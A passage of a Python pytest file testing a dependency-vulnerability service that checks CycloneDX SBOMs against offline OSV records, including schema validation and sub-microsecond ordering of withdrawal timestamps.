        json.dumps({"bomFormat": "CycloneDX", "specVersion": "1.7", "components": []})
    )
    (tmp_path / "osv.json").write_text(
        json.dumps(
            {
                "schema_version": schema,
                "id": "OSV-SCHEMA",
                "modified": "2026-10-18T00:00:00Z",
                "affected": [],
            }
        )
    )
    with pytest.raises(ValueError):
        DependencyAgentService(tmp_path).reevaluate_vulnerabilities(
            "bom.json", "osv.json"
        )


@pytest.mark.parametrize(
    "withdrawn,status",
    [
        ("2026-10-18T00:00:00.000001001Z", "matched"),
        ("2026-10-18T00:00:00.000001Z", "not-matched-in-supplied-records"),
    ],
)
def test_offline_osv_withdrawal_retains_submicrosecond_order(
    tmp_path, monkeypatch, withdrawn, status
):
    import datetime
    from depcheck.security import offline

    class FixedDatetime(datetime.datetime):
        @classmethod
        def now(cls, tz=None):
            return cls(2026, 10, 18, 0, 0, 0, 1, tzinfo=datetime.timezone.utc)

    monkeypatch.setattr(offline, "datetime", FixedDatetime)
    (tmp_path / "bom.json").write_text(
        json.dumps(
            {
                "bomFormat": "CycloneDX",
                "specVersion": "1.7",
                "components": [
                    {"bom-ref": "one", "name": "demo", "purl": "pkg:pypi/demo@1"}
                ],
            }
        )
    )
    (tmp_path / "osv.json").write_text(
        json.dumps(
            {
                "schema_version": "1.9.2",
                "id": "OSV-WITHDRAW",
                "modified": "2026-10-17T00:00:00Z",
                "withdrawn": withdrawn,
                "affected": [
                    {
                        "package": {"ecosystem": "PyPI", "name": "demo"},
                        "versions": ["1"],
                    }
                ],
            }
        )
    )
    result = DependencyAgentService(tmp_path).reevaluate_vulnerabilities(
        "bom.json", "osv.json"
    )
    assert result["observations"][0]["status"] == status
